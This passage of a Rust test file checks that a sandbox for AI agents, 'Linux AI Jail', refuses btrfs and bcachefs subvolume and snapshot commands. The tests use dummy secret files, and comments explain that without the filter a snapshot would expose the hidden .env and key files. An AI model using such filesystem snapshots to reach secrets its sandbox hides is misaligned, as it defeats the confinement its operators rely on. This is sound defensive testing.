/// jail a snapshot of it shows both, and in each jail both are hidden and
/// no snapshot shows them.
///
/// Needs a folder this user owns on such a disk in the disk's variable,
/// its tool and `python3`, and a host that starts a jail under the filter.
/// CI has no such disk, so it runs on a lab host (a loop-mounted disk will
/// do). Run without any of them, it fails: it never passes having proved
/// nothing.
#[cfg(target_os = "linux")]
fn no_jail_on_this_disk_makes_a_subvolume_or_snapshot(disk: &SubvolumeDisk) {
    let folder = std::env::var_os(disk.var)
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|| {
            panic!(
                "{}: a folder this user owns on a {} disk",
                disk.var, disk.kind
            )
        });
    let magic = Command::new("stat")
        .args(["-f", "-c", "%t"])
        .arg(&folder)
        .output()
        .expect("stat the folder's file system");
    assert_eq!(
        String::from_utf8_lossy(&magic.stdout).trim(),
        disk.magic,
        "{} is not on a {} disk",
        disk.var,
        disk.kind
    );
    let tool = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"]
        .into_iter()
        .map(|dir| std::path::Path::new(dir).join(disk.tool))
        .find(|p| p.is_file())
        .unwrap_or_else(|| panic!("the {} tool", disk.tool));
    assert!(
        Command::new("python3")
            .arg("--version")
            .stdin(std::process::Stdio::null())
            .output()
            .is_ok_and(|o| o.status.success()),
        "python3"
    );
    require_bwrap();
    assert_eq!(
        filter_here(),
        FilterHere::Taken,
        "this host must start a jail under the filter"
    );

    let work = tempfile::TempDir::new_in(&folder).unwrap();
    // A subvolume of this user's, made outside any jail.
    let subvolume = |at: &std::path::Path| {
        let made = Command::new(&tool)
            .args(["subvolume", "create"])
            .arg(at)
            .stdin(std::process::Stdio::null())
            .output()
            .unwrap();
        assert!(
            made.status.success(),
            "this user makes a subvolume outside the jail: {}",
            String::from_utf8_lossy(&made.stderr)
        );
    };
    let script = |text: &str, at: &std::path::Path| -> Vec<String> {
        vec![
            "/bin/sh".into(),
            "-c".into(),
            text.into(),
            "sh".into(),
            at.to_str().unwrap().into(),
            tool.to_str().unwrap().into(),
        ]
    };
    let outside = |text: &str, at: &std::path::Path| {
        let args = script(text, at);
        let output = Command::new(&args[0])
            .args(&args[1..])
            .stdin(std::process::Stdio::null())
            .output()
            .unwrap();
        (
            output.stdout.clone(),
            String::from_utf8_lossy(&output.stderr).into_owned(),
        )
    };
    let jailed = |text: &str, at: &std::path::Path, identity: bool| {
        let home = state_home();
        let mut command = cli();
        command.arg("contain");
        if identity {
            command.arg("--identity");
        }
        command
            .args(["--project", at.to_str().unwrap(), "--"])
            .args(script(text, at))
            .env("HOME", home.path())
            .stdin(std::process::Stdio::null());
        let output = identified_without_a_scope(&mut command)
            .output()
            .expect("run Linux AI Jail");
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        (
            output.stdout.clone(),
            String::from_utf8_lossy(&output.stderr).into_owned(),
        )
    };

    // One folder per place, each with a subvolume `src` to snapshot.
    let place = |name: &str| {
        let at = work.path().join(name);
        std::fs::create_dir(&at).unwrap();
        subvolume(&at.join("src"));
        at
    };
    let outside_at = place("outside");
    let (outside_out, outside_err) = outside(disk.script, &outside_at);
    let outside_answers = subvolume_answers(&outside_out);
    eprintln!("outside: {outside_answers:?}");
    for (key, name) in disk.made_by {
        let answer = outside_answers.get(*key).copied();
        if disk.newer.contains(key) && answer == Some(libc::ENOTTY) {
            eprintln!("{key}: this kernel's {} has no such command", disk.kind);
            continue;
        }
        assert_eq!(answer, Some(0), "{key} outside any jail: {outside_err}");
        assert!(outside_at.join(name).is_dir(), "{name} outside");
    }
    for identity in [false, true] {
        let at = place(if identity { "identified" } else { "plain" });
        let (out, err) = jailed(disk.script, &at, identity);
        let answers = subvolume_answers(&out);
        eprintln!("identity {identity}: {answers:?}");
        for (key, name) in disk.made_by {
            assert!(!at.join(name).exists(), "{name} made, identity {identity}");
            let answer = answers.get(*key).copied();
            if key.starts_with("tool_") {
                assert!(
                    answer.is_some_and(|a| a != 0),
                    "{key} identity {identity}: {err}"
                );
            } else {
                assert_eq!(
                    answer,
                    Some(libc::EPERM),
                    "{key} identity {identity}: {err}"
                );
            }
        }
        assert!(
            err.contains("Operation not permitted"),
            "the tool says why, identity {identity}: {err}"
        );
    }

    // The project is a subvolume holding the secrets the jail hides.
    let project = |name: &str| {
        let at = work.path().join(name);
        subvolume(&at);
        std::fs::write(at.join(".env"), "SECRET_DOTENV=hunter2\n").unwrap();
        std::fs::create_dir(at.join("secrets")).unwrap();
        std::fs::write(at.join("secrets/key"), "SECRET_KEY_FILE\n").unwrap();
        // On disk before any snapshot: bcachefs in Linux 6.12 can lose a
        // file written just before one, and then goes read-only.
        let synced = Command::new("sync")
            .stdin(std::process::Stdio::null())
            .status();
        assert!(synced.is_ok_and(|s| s.success()), "sync");
        at
    };
    let at = project("project-outside");
    let (out, err) = outside(SNAPSHOT_THE_PROJECT, &at);
    let text = String::from_utf8_lossy(&out);
    assert_eq!(
        subvolume_answers(&out).get("project_snapshot"),
        Some(&0),
        "a snapshot of the project outside any jail: {err}"
    );
    for line in [
        "before: SECRET_DOTENV=hunter2",
        "before: SECRET_KEY_FILE",
        "copy: SECRET_DOTENV=hunter2",
        "copy: SECRET_KEY_FILE",
    ] {
        assert!(text.contains(line), "outside any jail: {line:?}: {text}");
    }
    for identity in [false, true] {
        let at = project(if identity {
            "project-identified"
        } else {
            "project-plain"
        });
        let (out, err) = jailed(SNAPSHOT_THE_PROJECT, &at, identity);
        let text = String::from_utf8_lossy(&out);
        let answers = subvolume_answers(&out);
        assert!(
            answers.get("project_snapshot").is_some_and(|a| *a != 0),
            "a snapshot of the project, identity {identity}: {text} {err}"
        );
        // Hidden in the jail, and in no copy of the project.
        assert!(!text.contains("SECRET_"), "identity {identity}: {text}");
        assert!(!at.join("snap").exists(), "identity {identity}");
    }
}

/// [`no_jail_on_this_disk_makes_a_subvolume_or_snapshot`] on btrfs: the
/// four commands, and the `btrfs` tool's create and snapshot.
/// `IW_BTRFS_DIR=<folder> cargo test -p innerwarden --test cjc_j007_ai_jail
/// -- --ignored on_a_btrfs_disk </dev/null`.
///
/// FAILS ON REVERT (measured): refuse the btrfs commands in the identified
/// filter alone, and the plain jail makes each subvolume and snapshot, and
/// its snapshot of the project shows `.env` and `secrets/key`.
#[cfg(target_os = "linux")]
#[test]
#[ignore = "needs a btrfs folder in IW_BTRFS_DIR, the btrfs tool and python3: a lab host runs it with --ignored"]
fn on_a_btrfs_disk_no_jail_makes_a_subvolume_or_snapshot() {
    no_jail_on_this_disk_makes_a_subvolume_or_snapshot(&SubvolumeDisk {
        kind: "btrfs",
        magic: "9123683e",
        var: "IW_BTRFS_DIR",
        tool: "btrfs",
        script: MAKE_BTRFS_SUBVOLUMES,
        made_by: &[
            ("tool_subvolume", "tool-subvol"),
            ("tool_snapshot", "tool-snap"),
            ("snap_create", "v1-snap"),
            ("subvol_create", "v1-subvol"),
            ("snap_create_v2", "v2-snap"),
            ("subvol_create_v2", "v2-subvol"),
        ],
        newer: &[],
    });
}

/// [`no_jail_on_this_disk_makes_a_subvolume_or_snapshot`] on bcachefs: both
/// commands, each as a new subvolume and as a snapshot, and the `bcachefs`
/// tool's create and snapshot. A kernel whose bcachefs has no `_v2`
/// command answers it `ENOTTY` outside any jail, and the jail still refuses
/// it. `IW_BCACHEFS_DIR=<folder> cargo test -p innerwarden --test
/// cjc_j007_ai_jail -- --ignored on_a_bcachefs_disk </dev/null`.
///
/// FAILS ON REVERT (measured): drop the bcachefs commands from the filter,
/// and each jail makes each subvolume and snapshot, and its snapshot of the
/// project shows `.env` and `secrets/key`.
#[cfg(target_os = "linux")]
#[test]
#[ignore = "needs a bcachefs folder in IW_BCACHEFS_DIR, the bcachefs tool and python3: a lab host runs it with --ignored"]
fn on_a_bcachefs_disk_no_jail_makes_a_subvolume_or_snapshot() {
    no_jail_on_this_disk_makes_a_subvolume_or_snapshot(&SubvolumeDisk {
        kind: "bcachefs",
        magic: "ca451a4e",
        var: "IW_BCACHEFS_DIR",
        tool: "bcachefs",
        script: MAKE_BCACHEFS_SUBVOLUMES,
        made_by: &[
            ("tool_subvolume", "tool-subvol"),
            ("tool_snapshot", "tool-snap"),
            ("subvolume_create", "v1-subvol"),
            ("snapshot_create", "v1-snap"),
            ("subvolume_create_v2", "v2-subvol"),
            ("snapshot_create_v2", "v2-snap"),
        ],
        newer: &["subvolume_create_v2", "snapshot_create_v2"],
    });
}
